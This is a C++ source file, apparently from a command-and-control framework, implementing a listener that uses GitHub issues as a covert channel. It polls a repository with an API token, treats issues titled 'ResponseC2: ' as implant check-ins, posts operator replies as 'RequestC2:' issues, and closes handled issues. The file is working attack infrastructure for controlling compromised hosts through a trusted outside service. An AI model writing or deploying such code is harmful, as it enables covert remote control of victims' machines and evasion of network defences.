#include "ListenerGithub.hpp"


using namespace std;
using namespace httplib;


ListenerGithub::ListenerGithub(const std::string& project, const std::string& token)
	: Listener("127.0.0.1", 911, ListenerGithubType)
	, m_project(project)
	, m_token(token)
{	
	m_listenerHash = random_string(SizeListenerHash);
	m_listenerHash += "-";
	m_listenerHash += ListenerGithubType;
	m_listenerHash += "/";
	m_listenerHash += project;

	m_isRunning=true;
	this->m_githubFetcher = std::make_unique<std::thread>(&ListenerGithub::checkGithubIssues, this);
}


ListenerGithub::~ListenerGithub()
{
	m_isRunning=false;
	m_githubFetcher->join();
}


void ListenerGithub::checkGithubIssues()
{
	while(m_isRunning)
	{
		std::string url = "https://api.github.com";
		httplib::Client cli(url);

		std::string token = "token ";
		token+=m_token;

		httplib::Headers headers = {
			{ "Accept", "application/vnd.github+json" },
			{ "Authorization", token },
			{ "Cookie", "logged_in=no" }
		};

		// get list of issues
		std::string endpoint = "/repos/";
		endpoint += m_project;	
		endpoint += "/issues";	
		auto response = cli.Get(endpoint, headers);

		if(response->status!=200)
		{
			DEBUG("Error with the ListenerGithub: " << response->body);
			continue;
		}

		if(!response->body.empty())
		{
			json my_json = json::parse(response->body);

			// for every issue in the list
			for (json::iterator it = my_json.begin(); it != my_json.end(); ++it)
			{				
				std::string title = (*it)["title"];
				std::string body = (*it)["body"];
				int number = (*it)["number"];

				DEBUG("[+] handle issue: " << std::to_string(number));

				if(title.rfind("ResponseC2: ", 0) == 0)
				{
					std::string res;
					HandleCheckIn(body, res);

					// generate the response for response who got content 
					if(res.size()>4)
					{
						json responseData = {
							{"title", "RequestC2: toto"},
							{"body", res},
							};

						std::string data = responseData.dump();
						std::string contentType = "application/json";
						auto response = cli.Post(endpoint, headers, data, contentType);

						if(response->status!=200)
						{
							DEBUG("Error with the ListenerGithub: " << response->body);
							continue;
						}
					}

					std::string data = "{\"state\":\"closed\"}";
					std::string contentType = "application/json";

					// close the issue
					std::string issueEndpoint = "/repos/";
					issueEndpoint += m_project;	
					issueEndpoint += "/issues/";
					issueEndpoint += std::to_string(number);	
					auto response = cli.Post(issueEndpoint, headers, data, contentType);
				}
			}
		}	

		std::this_thread::sleep_for(std::chrono::milliseconds(1000));
	}
}


int ListenerGithub::HandleCheckIn(const std::string& req, std::string& output)
{
	bool ret = handleMessages(req, output);

	DEBUG("output.size " << std::to_string(output.size()));

	return 0;
}
